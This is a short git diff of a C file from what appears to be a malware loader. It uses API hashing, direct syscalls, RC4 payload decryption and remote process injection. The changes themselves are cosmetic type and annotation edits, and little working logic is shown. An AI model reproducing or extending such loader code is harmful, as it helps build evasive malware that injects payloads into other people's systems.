@@ -3,7 +3,7 @@
 #include "Common.h"
 #include "Debug.h"
 
-unsigned char ProtectedKey[] = { 0x42, 0x95, 0xCA, 0x94, 0xBB, 0xED, 0x81, 0x24, 0x93, 0xD2, 0x5A, 0x1D, 0x78, 0x5D, 0x85, 0x9C };
+UCHAR ProtectedKey[] = { 0x42, 0x95, 0xCA, 0x94, 0xBB, 0xED, 0x81, 0x24, 0x93, 0xD2, 0x5A, 0x1D, 0x78, 0x5D, 0x85, 0x9C };
 
 // global `VX_TABLE` structure
 VX_TABLE 	g_Sys = { 0 };
@@ -82,7 +82,7 @@ BOOL ApiHashing() {
 	return TRUE;
 }
 
-BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {
 
 	// The return of SystemFunction032
 	NTSTATUS        	STATUS = NULL;
@@ -246,7 +246,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	return TRUE;
 }
 
-BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {
+BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
 
 	ULONG					    uReturnLen1 = NULL,
 		uReturnLen2 = NULL;
